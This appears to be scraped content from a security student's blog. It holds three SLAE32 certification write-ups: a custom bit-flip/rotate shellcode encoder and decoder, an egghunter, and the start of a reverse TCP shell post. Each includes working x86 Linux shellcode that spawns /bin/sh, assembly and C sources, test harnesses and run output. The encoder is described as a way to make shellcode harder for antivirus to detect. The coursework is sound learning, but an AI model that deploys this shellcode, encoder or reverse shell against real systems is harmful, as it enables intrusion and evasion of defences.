self.randomKeyGenerator() print(\u0026#34;[*] Doing magic with a (pseudo) Random key\u0026#34;) print(\u0026#34;[*] Key: \u0026#34;+hex(self.key)) Then, we can call the function insertion_encode and provide the target shellcode as argument.\nencoder = Encoder(enc_type, key) # providing a key with insertion encoding type encoder.insertion_encode(shellcode) # call insertion code with target shellcode as argument The insertion_encode function is defined as follows:\ndef insertion_encode(self, shellcode): encoded = \u0026#39;\u0026#39; # 0x format encoded2 = \u0026#39;\u0026#39; # \\x format rotation_direction = \u0026#39;\u0026#39; rotation_counter = 0 for shellbyte in shellcode: flipped_shellbyte = shellbyte ^ 0x01 # flip lowest bit if bin(flipped_shellbyte)[-1] == \u0026#39;0\u0026#39;: logging.info(\u0026#34;Flipped byte - odd - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.rightRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits rotation_direction = \u0026#39;0x02\u0026#39; else: logging.info(\u0026#34;Flipped byte - even - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits print(\u0026#34;After rotation: \u0026#34;+ bin2hex(self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter%8))) rotation_direction = \u0026#39;0xff\u0026#39; final_shellbyte = bin2hex(rotated_shellbyte) rotation_counter += 1 encoded += final_shellbyte + \u0026#39;,\u0026#39; + rotation_direction +\u0026#39;,\u0026#39; # \\x format encoded2 += \u0026#39;\\\\x\u0026#39; + final_shellbyte[2:] + \u0026#39;\\\\x\u0026#39; + rotation_direction[2:] # \\x format print(\u0026#34;\\n[*] \\\\x format: \u0026#34;) encoded2 += \u0026#39;\\\\x\u0026#39; + hex(self.key)[2:] # add marker print(encoded2) print(\u0026#34;\\n[*] 0x format: \u0026#34;) encoded += \u0026#39;0x\u0026#39; + hex(self.key)[2:] + \u0026#39;,\u0026#39; + \u0026#39;0x\u0026#39; + hex(self.key)[2:] #add marker print(encoded) We started by interating each shellcode byte and flipping the least significant bit - flipped_shellbyte\nAfter that, checking that same bit for parity. if it is 1 is odd but if is 0 is even. An odd number will rotate right and an even rotate left. Before proceeeding to the rotation we convert the byte to binary in order to have a more robust rotation. The rotation_counter is used as a reference for the number of rotated bits.\nAlso as each byte has 8 bits in size, the rotation is performed according to a circular shift methodology by using the modulus % operator. Using the remainder we stick to rotate only a maximum of 7 bits each time.\nAfter performing the rotation and convert the binary number to hexadecimal the encoding is completed - final_shellbyte. We can append it to the variables where the shellcode is being stored encoded and encoded2 followed by the rotation_direction (0x02 or 0xfff).\nif bin(flipped_shellbyte)[-1] == \u0026#39;0\u0026#39;: logging.info(\u0026#34;Flipped byte - odd - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.rightRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits rotation_direction = \u0026#39;0x02\u0026#39; else: logging.info(\u0026#34;Flipped byte - even - \u0026#34;+str(flipped_shellbyte)) rotated_shellbyte = self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter% 8 ) # 8 because we are rotating with 8 bits print(\u0026#34;After rotation: \u0026#34;+ bin2hex(self.leftRotate(format(flipped_shellbyte,\u0026#39;08b\u0026#39;),rotation_counter%8))) rotation_direction = \u0026#39;0xff\u0026#39; final_shellbyte = bin2hex(rotated_shellbyte) rotation_counter += 1 encoded += final_shellbyte + \u0026#39;,\u0026#39; + rotation_direction +\u0026#39;,\u0026#39; # \\x format encoded2 += \u0026#39;\\\\x\u0026#39; + final_shellbyte[2:] + \u0026#39;\\\\x\u0026#39; + rotation_direction[2:] # \\x format The last part, we add the end marker at the end for each shellcode format\nprint(\u0026#34;\\n[*] \\\\x format: \u0026#34;) encoded2 += \u0026#39;\\\\x\u0026#39; + hex(self.key)[2:] # add marker print(encoded2) print(\u0026#34;\\n[*] 0x format: \u0026#34;) encoded += \u0026#39;0x\u0026#39; + hex(self.key)[2:] + \u0026#39;,\u0026#39; + \u0026#39;0x\u0026#39; + hex(self.key)[2:] #add marker print(encoded) Encoder Output ╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› ╰─$ python3 flipRotation_Encoder.py _______________________________________________________________ \u0026lt;The \u0026#34;FlipRotation\u0026#34; Encoder - Bit flip and rotate your shellcode --------------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || [*] Shellcode length: 25 [*] Shellcode: b\u0026#39;1\\xc0Ph//shh/bin\\x89\\xe3P\\x89\\xe2S\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#39; [*] Key Provided by the user. Doing magic with it [*] Key: 0xa0 After rotation: 0x83 After rotation: 0x45 After rotation: 0x4b After rotation: 0xb4 After rotation: 0x69 After rotation: 0x8d After rotation: 0xf6 After rotation: 0xa8 After rotation: 0xc7 After rotation: 0x36 After rotation: 0x81 [*] \\x format: \\x30\\x02\\x83\\xff\\x45\\xff\\x4b\\xff\\xe2\\x02\\x71\\x02\\xc9\\x02\\xb4\\xff\\x69\\xff\\x17\\x02\\x8d\\xff\\xd\\x02\\xf6\\xff\\x44\\x02\\x8b\\x02\\xa8\\xff\\x88\\x02\\xc7\\xff\\x94\\x02\\x11\\x02\\xe\\x02\\x36\\xff\\x28\\x02\\x99\\x02\\x81\\xff\\xa0 [*] 0x format: 0x30,0x02,0x83,0xff,0x45,0xff,0x4b,0xff,0xe2,0x02,0x71,0x02,0xc9,0x02,0xb4,0xff,0x69,0xff,0x17,0x02,0x8d,0xff,0xd,0x02,0xf6,0xff,0x44,0x02,0x8b,0x02,0xa8,0xff,0x88,0x02,0xc7,0xff,0x94,0x02,0x11,0x02,0xe,0x02,0x36,0xff,0x28,0x02,0x99,0x02,0x81,0xff,0xa0,0xa0 -------------------- [*] Hack the World! -------------------- We have the encoded shellcode already with rotatio direction for each byte and the end marker.\nDecoder I said before that it was simpler than the conder but it was not easy at all. I needed to use a piece of paper and a pencil to develop the logic to decode the payload in assembly.\nLet\u0026rsquo;s dig into the assembly\n; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 4 : Custom Encoder/Decoder Shellcode (Linux/x86) Assembly - FlipRotation Encoder ; File Name : flipRotation_decoder.nasm global _start section .text _start: jmp short call_decoder decoder: pop esi lea edi, [esi+1]\t; pointing to second byte (0x02) from shellcode xor eax, eax ; keep track parity byte cdq\t; zeroes edx. mov al,\t1 xor ecx, ecx xor ebx, ebx decode: mov bl, byte [esi + eax]\t; mov parity byte to bl xor bl, 0xa0\t; check if reached the end marker | 0xa0 ^ 0xff = 0x5f jz short EncodedShellcode\t; reached the marker if Zero Flag not set xor bl, 0x5f\t; if equal, parity is even (0xff) mov bl, byte [esi + edx] jnz odd even:\t; rotate right ror bl, cl jmp short bitFlip odd: ; rotate left rol bl, cl bitFlip: xor bl, 0x01 restore_next_byte: mov byte [esi + edx], bl\t; replaces the original byte mov bl, byte [esi + eax + 1] ; mov next shellbyte mov byte [edi], bl inc edi add al, 2 inc dl inc cl ; = 0x2b F - 00101011 ; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). cmp cl, 0x08\t; if equal ZF will be set meaning we have a complete rotation jnz decode\t; $+2 ; jump if rotation is not complete xor ecx, ecx\t; if rotation is complete reset, cl to start again the \u0026#34;circular array\u0026#34; jmp short decode call_decoder: call decoder EncodedShellcode: db 0x30,0x02,0x83,0xff,0x45,0xff,0x4b,0xff,0xe2,0x02,0x71,0x02,0xc9,0x02,0xb4,0xff,0x69,0xff,0x17,0x02,0x8d,0xff,0xd,0x02,0xf6,0xff,0x44,0x02,0x8b,0x02,0xa8,0xff,0x88,0x02,0xc7,0xff,0x94,0x02,0x11,0x02,0xe,0x02,0x36,0xff,0x28,0x02,0x99,0x02,0x81,0xff,0xa0,0xa0 ; 0xa0 is the stop marker Divide and Conquer the FlipRotation Decoder This decoder use the jmp-call-pop technique to push the address of the encoded shellcode on the stack and redirect control flow to decoder branch. Then, the address is stored in esi\nWe use eax to keep track the each parity byte and edx to control the offset from the beginning of the shellcode.\ndecoder: pop esi lea edi, [esi+1]\t; pointing to second byte (0x02) from shellcode xor eax, eax ; keep track parity byte cdq\t; zeroes edx. mov al,\t1 ; first parity byte xor ecx, ecx ; loop index and number of rotation bits xor ebx, ebx After this, we have our decoder branch which has the logic to decode the encoded shellcode. It start by moving the parity byte and checking with xor bl, 0xa0 if matches the end marker. If yes, it means the shellcode is alrady decoded and redirects execution flow to its first instruction.\nThe result of this xor operation using the parity byte will be used below with the operation xor bl, 0x5f to verify if associated shellcode byte is odd or even.\nWe know because if we have a even shellcode byte, its parity is 0xff and results in 0xa0 ^ 0xff = 0x5f which si stored in bl. Then doing xor bl, 0x5f will set ZF (zero flag) to 1. Based on the zero flag value, we know if the shellcode byte is even or odd.\ndecode: mov bl, byte [esi + eax]\t; mov parity byte to bl xor bl, 0xa0\t; check if reached the end marker | 0xa0 ^ 0xff = 0x5f jz short EncodedShellcode\t; reached the marker if Zero Flag not set xor bl, 0x5f\t; if equal, parity is even (0xff) and sets ZF mov bl, byte [esi + edx] jnz odd The next couple of isntruction are straighforward. We just to rotate in the oposite way that was performed by the encoder according to the byte parity and bit flipping the least significant bit.\neven:\t; rotate right ror bl, cl jmp short bitFlip odd: ; rotate left rol bl, cl bitFlip: xor bl, 0x01 At this stage, the tricky is already done. We just to replace the encoded shellcode byte for the original one using edx as offset. Then, we move to bl the next encoded byte.\nWe cant forget to remove the last used parity byte from the encoded shellcode. In the decode branch we set up edi to point the address of the first parity byte. To remove this byte, we can make the next encoded shellcode byte to take its place. In practical terms, we copy the next encoded byte to the address of the last parity byte with the instruction mov byte [edi], bl\nThen, we prepare he next iteration by:\npointing edi to the position of next parity byte al poiting to the next parity byte offset dl poiting to the next encoded byte incrementing cl which is used as the loop index value The last part, we check if we reach the end of the circular array. As we are rotating 8 bits, we can\u0026rsquo;t rotate no more than that. this way we aresynchronized with the encoder implementation.\nrestore_next_byte: mov byte [esi + edx], bl\t; replaces the original byte mov bl, byte [esi + eax + 1] ; mov next encoded byte mov byte [edi], bl\t; change last used parity byte for the next encoded byte inc edi\t; edi points to position of the next parity add al, 2\t; offset added to next parity byte inc dl\t; offset to the next encoded byte inc cl ; loop index value incremented ; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). cmp cl, 0x08\t; if equal ZF will be set meaning we have a complete rotation jnz decode\t; jump if rotation is not complete xor ecx, ecx\t; if rotation is complete, reset cl to start again the \u0026#34;circular array\u0026#34; Compiling and Testing the FlipRotation Decoder Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ../../assembler.sh egg_hunter.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 122 \u0026#34;\\xeb\\x3f\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\x99\\xb0\\x01\\x31\\xc9\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xa0\\x74\\x2f\\x80\\xf3\\x5f\\x8a\\x1c\\x16\\x75\\x04\\xd2\\xcb\\xeb\\x02\\xd2\\xc3\\x80\\xf3\\x01\\x88\\x1c\\x16\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xfe\\xc2\\xfe\\xc1\\x80\\xf9\\x08\\x75\\xd2\\x31\\xc9\\xeb\\xce\\xe8\\xbc\\xff\\xff\\xff\\x30\\x02\\x83\\xff\\x45\\xff\\x4b\\xff\\xe2\\x02\\x71\\x02\\xc9\\x02\\xb4\\xff\\x69\\xff\\x17\\x02\\x8d\\xff\\x0d\\x02\\xf6\\xff\\x44\\x02\\x8b\\x02\\xa8\\xff\\x88\\x02\\xc7\\xff\\x94\\x02\\x11\\x02\\x0e\\x02\\x36\\xff\\x28\\x02\\x99\\x02\\x81\\xff\\xa0\\xa0\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\xeb\\x3f\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\x99\\xb0\\x01\\x31\\xc9\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xa0\\x74\\x2f\\x80\\xf3\\x5f\\x8a\\x1c\\x16\\x75\\x04\\xd2\\xcb\\xeb\\x02\\xd2\\xc3\\x80\\xf3\\x01\\x88\\x1c\\x16\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xfe\\xc2\\xfe\\xc1\\x80\\xf9\\x08\\x75\\xd2\\x31\\xc9\\xeb\\xce\\xe8\\xbc\\xff\\xff\\xff\\x30\\x02\\x83\\xff\\x45\\xff\\x4b\\xff\\xe2\\x02\\x71\\x02\\xc9\\x02\\xb4\\xff\\x69\\xff\\x17\\x02\\x8d\\xff\\x0d\\x02\\xf6\\xff\\x44\\x02\\x8b\\x02\\xa8\\xff\\x88\\x02\\xc7\\xff\\x94\\x02\\x11\\x02\\x0e\\x02\\x36\\xff\\x28\\x02\\x99\\x02\\x81\\xff\\xa0\\xa0\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› ╰─$ ./shellcode Shellcode Length: 122 $ id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) $ ls core flipRotation_Encoder.py flipRotation_decoder flipRotation_decoder.nasm flipRotation_decoder.o shellcode shellcode.c $ We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae_32_assignment_4/","summary":"This post introduces the forth mission to my SLAE32 journey.\nA really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).","title":"SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)"},{"content":" This post introduces the third mission to my SLAE32 journey.\nA cool challenge not covered during the course which made me to research and understand the concept and which scenarios its applicable.\nIntroduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory??? What is a Egghunter? An egghunter is useful when there is limited buffer space controlled by an attacker to put an entire shellcode on the stack.\nTo get around this contrainst an egghunter acts as a staged payload. This means the smaller payload is capable of searching the through the entire memory space for a maker or egg. Once finds the egg, it indicates the start of the larger payload (shellcode) and redirect the execution flow to the instructions placed after the egg.\nA reference research paper was made by Skape in 2004 named Safely Searching Process Virtual Address Space with pratical examples of different egghunter implementations.\nBasic Concepts Before goign into the code details, it\u0026rsquo;s important to have in mind some concepts to understand the internals of an egghunter.\nx86 Linux Memory Pages The manybutfinite.com article about Linux memory management states that:\n“x86 processors in 32-bit mode support page sizes of 4KB, 2MB, and 4MB. Both Linux and Windows map the user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on.”\nThis is an important concept to be aware of because our egghunter will be iterating through pages of memory searching for the egg.\nIf the egghunter is able to use a sycall to check for the egg in page 0 (bytes 0-4095) and if the used syscall returns an exit code which states if the memory location is accessible or not, based on that the egghunter can skip to the next page of memory (page 1).\nThis way saves time and increases its performance.\nAccess Syscall - Can we read or not? Based on Skape paper, there are some syscalls that can be used for this task. For this assignment, I used the access(2) syscall.\nThe npurpose of access(2) syscall, is to check effectively if a page memory is accessible or not. According to access man page (man 2 access), this syscall is used to check if the calling process has access to a determined file.\nIn this assignment context, we will be using the exit codes to check memory pages permissions. If returns an error (EFAULT) with value 0xf2 it means the memory oage is inaccessible. If return any other value, we are good to go to search that page looking for the egg.\nDouble Egg by this time, we know the egg should be placed right before the shellcode we can make is more robust placing it twice instead of just one. This way if the the egghunter finds itself we avoid unexpected behaviour from the program.\nIn practical terms, the shellcode structure is: egg+egg+shellcode\n\u0026ldquo;Assembling\u0026rdquo; our Egghunter First, the egg is pplaced into ebx This register will be used after to compare with memory content.\nmult ecx after clearing ecx register is used to clear eax and edx. mul multiplies its operand with eax and saves the result in eax and edx. A small trick to save space with less opcodes.\nmov ebx, 0x50905090 ; the egg - 0x50905090 xor ecx, ecx mul ecx ; trick clear eax and edx After that, we mov 0xffff (4095 bytes) to dx. A memory page has 4096 bytes in size but putting the value 0x1000 (4096 bytes) in dx will contain null bytes. Instead we mov 0xffff to dx and increment it after inc edx inside the address_inspection: branch.\npage_alignment: or dx, 0xfff ; sets dx to 4095 address_inspection: inc edx ; sets dx to 4096 The next step is to analyze the memory page and check if we are able to access it. To achieve this goal, the address_inspection: branch will start to increment EDX to have make it 4096. After that, to preserve the register values with push their value into the stack with pushad instruction.\nThen, we put the next 4 bytes of memory into ebx, load the access(2) syscall to al, and then execute it on that memory address.\naddress_inspection: inc edx ; edx becomes 4096 pushad ; saves all registers values lea ebx, [edx+4] ; load the address of the next 4 bytes mov al, 0x21 ; set the value of the access syscall int 0x80 In order to verify if the memory page accessible or not we will used the compare opcode - cmp.\nThe compare cmp opcode takes two operands and subtracts them, if the result is a 0, the zero-flag is set and you know that the two operands are equal.\nThe return code iss aved into eax. If the EFAULT (0xf2) error is there, our shellcode will jump to the page_alignment: branch to check the following memory page.\ncmp al, 0xf2 popad jz page_alignment But if the memory can be accessed, we will compare the value of the acessible memory which is stored at edx with ebx which holds our egg. If it does not match, we will jump to our address_inspection: branch and keep reading through the page.\nIf the value of what is stored at edx matches our egg, then we have to see if [edx]+4 also does to make sure we don\u0026rsquo;t have a false positive and match our double egg requirement. If it is only found once, then it’s probably just our egghunter finding itself.\nFinally, if both cmp calls result in zeros then we tell the code to jump to edx which will execute the code stored there (our real shellcode).\ncmp [edx], ebx jnz address_inspection cmp [edx+4], ebx jnz address_inspection jmp edx Final Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 3 : Egghunter Shellcode (Linux/x86) Assembly ; File Name : egg_hunter.nasm global _start section .text _start: mov ebx, 0x50905090 xor ecx, ecx mul ecx page_alignment: or dx, 0xfff address_inspection: inc edx pushad lea ebx, [edx+4] mov al, 0x21 int 0x80 cmp al, 0xf2 popad jz page_alignment cmp [edx], ebx jnz address_inspection cmp [edx+4], ebx jnz address_inspection jmp edx Compiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ../../assembler.sh egg_hunter.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 39 \u0026#34;\\xbb\\x90\\x50\\x90\\x50\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xed\\x39\\x1a\\x75\\xee\\x39\\x5a\\x04\\x75\\xe9\\xff\\xe2\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned char egghunter[] = \u0026#34;\\xbb\\x90\\x50\\x90\\x50\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xed\\x39\\x1a\\x75\\xee\\x39\\x5a\\x04\\x75\\xe9\\xff\\xe2\u0026#34;; unsigned char shellcode[] = \u0026#34;\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;; int main(void) { printf(\u0026#34;Egg hunter length: %d\\n\u0026#34;, strlen(egghunter)); printf(\u0026#34;Shellcode length: %d\\n\u0026#34;, strlen(shellcode)); void (*s)() = (void *)egghunter; s(); return 0; } To execute a shell I used the execve shellcode stack covered during the course.\nCompiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o egghunter_tester shellcode.c ╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ./egghunter_tester Egg hunter length: 39 Shellcode length: 33 $ id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) $ ls egg_hunter egg_hunter.nasm egg_hunter.o egghunter_tester shellcode shellcode.c $ We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae_32_assignment_3/","summary":"This post introduces the third mission to my SLAE32 journey.\nA cool challenge not covered during the course which made me to research and understand the concept and which scenarios its applicable.\nIntroduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads.","title":"SLAE32 Assignment 3 - Egghunter Shellcode"},{"content":" This post introduces the second mission to my SLAE32 journey.\nI spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won\u0026rsquo;t be as much detailed this time but guess what?\nThe best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!\nIntroduction The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode.\nThe requirements are:\nReverse shell connects to the configured IP and port; Executing a shell on successful connection; The shellcode should be null-free; With the ability for the IP and port to be easily configurable. In other words, the IP and connection port should be easy to set up for the user. What is a Reverse Shell? A reverse shell instead of waiting for connections it connects back to a remote machine which is waiting for a connection of the target machine.\nThe input and output are redirect to the reverse shell socket so the remote machine can interact with the target machine remotely.\nA TCP reverse shell is a common technique to bypass firewall restrictions and have access to systems that are unreachable from public networks.\nBasics First Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper reverse shell. This way, we will better understand how the internals work and where to debug if an error occurs.\nMy approach was to analyze TCP reverse shell implementation in a higher-level language, such as C.\nC Prototype Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;netinet/ip.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main () { const char* ip = \u0026#34;127.0.0.1\u0026#34;;\t// Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9001); addr.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); // 1) Socket Syscall int sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Connect Syscall connect(sockfd, (struct sockadr *)\u0026amp;addr, sizeof(addr)); // 3) Dup2 Syscall for (int i = 0; i \u0026lt; 3;i++) { dup2(sockfd, i); } // 4) Execve Syscall execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); return 0; } Testing the code to see how it behaves.\nCompiling with gcc\n$ gcc reverse.c -o reverse\nAs this is a reverse shell, we first need to execute a listener for port 9001 with nc. Then we can run reverse to establish a connection back to our listener.\nThe C reverse shell works as expected. From this we have a reference to build our shellcode.\nChecking which syscalls are used In total there are 4 syscalls enumerated below:\n*socket* - 359 - 0x167 connect - 362 - 0x16a --\u0026gt; new syscall *dup2* - 63 - 0x3f *execve* - 11 - 0xb The highlighted syscalls we already have the code from the previous assignment. The new addition is the connect syscall. The difference for the bind shell instead of defining a local interface we need to specify a remote IP and a port.\nWe can use the file /usr/include/x86_64-linux-gnu/asm/unistd_32 to check the definiton of each syscall.\nAs connect is the only new syscall I will only focused to review only that one. For the other please check assignment 1.\nConnect syscall (0x16a) The C code defines it as the following:\nStruct sockaddr_in // Server Address struct int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; Connect syscall // Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9001); addr.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); // 1) Socket Syscall int sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Connect Syscall connect(sockfd, (struct sockadr *)\u0026amp;addr, sizeof(addr)); With the following arguments:\nint sockfd - sockfd is the socket descriptor returned by socket() in eax. const struct sockaddr *addr - pointer to struct sockaddr that contains information about your IP address and por socklen_t addrlen - addrlen specifies the size, in bytes, of the address structure pointed to by addr. In other words, addrlen is set to sizeof(struct sockaddr). The explanation on how to setup the value for these parameters is also the same provided in assignment 1 (2 - Bind Syscall (0x169) section).\n\u0026ldquo;Assembling\u0026rdquo; our shellcode For this one I didn\u0026rsquo;t put on effort to reduce the size of the shellcode. The isntructions here for same syscalls do the same thing but use more space in memory.\nxor eax, eax xor ebx, ebx xor ecx, ecx cdq ; zeroes edx (trick to use less space) After this it\u0026rsquo;s time to set up the syscall arguments havinmg the C code as a reference.\n; socket syscall mov ax, 0x167 mov bl, 0x02 mov cl, 0x01 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax EAX contains 0x167 which is sys_socket as seen in /usr/include/i386-linux-gnu/asm/unistd_32.h, then EBX is set to 0x2 (PF_INET).\nNext the value 0x01 is moved into ECX which is the value of SOCK_STREAM. EDX is already zero because of the previous cdq instruction.\nJust left to use the interruption syscall int 0x80 to create the socket.\nIf executed successfully, we have our socket. The next step is to setting up the connect syscall.\nBeforehand, let\u0026rsquo;s prepare the next syscall which is connect\n; accept syscall mov ebx, eax ; moves socket address to ebx (first arg of bind syscall - sockfd) xor eax, eax Then , the sockaddr_in struct is created as follows:\n; sockaddr struct push edx\t; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u0026gt; 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp The struct is finally defined. The most trickiest part to understand I must say.\nEDX is still zero so pushing zeroes will determine the end of the struct.\nNext, we push 0x0201017f which is the remote IP address (127.1.1.2).\nWhy 127.1.1.2 and 127.0.0.1?\nThe address 127.0.0.1 contains null-bytes (0x0100007f) which would break our shellcode. We need to go with an alternative way.\nBy using 127.1.1.2, we avoid those null bytes (0x0201017f). This works because the localhost address has a netmask of 255.0.0.0. The only limitation is the first 8 bytes, which is why the address 127.0.0.1 behaves the same way.\nThe next step is to load the stack with the port number. As intel works with the little-endian format, we push 0x2923, which is the value 9001. Lastly, pushing 0x2 refers to AF_INET.\nNow, it is just a matter of putting 0x10 (16 bytes) to EDX which represents the size of sockaddr_in struct as mentioned in the previous section and execute the bind syscall with 0x169 in EAX.\nmov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 It ends-up like this\n; connect syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax ; sockaddr struct push edx\t; ; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u0026gt; 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 For dup2 we use a loop to use less instructions to save space while constructing a fully interactive bind shell.\n; dup2 syscall mov edx, eax ; edx is already zero mov cl, 0x03 dup2: ;xor eax, eax ;mov al, 0x3f push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 We reach the final stage, using execve syscall to execute /bin/sh and spawn a shell when a connection is made to the bind port. If all works as expected a system shell will be provided to the incoming connection which can interact with the target machine.\n; execve xor eax, eax cdq push eax push 0x68732f2f ; \u0026#34;hs//\u0026#34; push 0x6e69622f ; \u0026#34;nib/\u0026#34; mov ebx, esp mov al, 0xb int 0x80\tTo help reverting the string used with execve I develop a script called the The x86 \u0026quot;Little-Hexdian\u0026quot; String Convert which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py\nFinal Assembly Code ; Student ID : PA-31319 ; 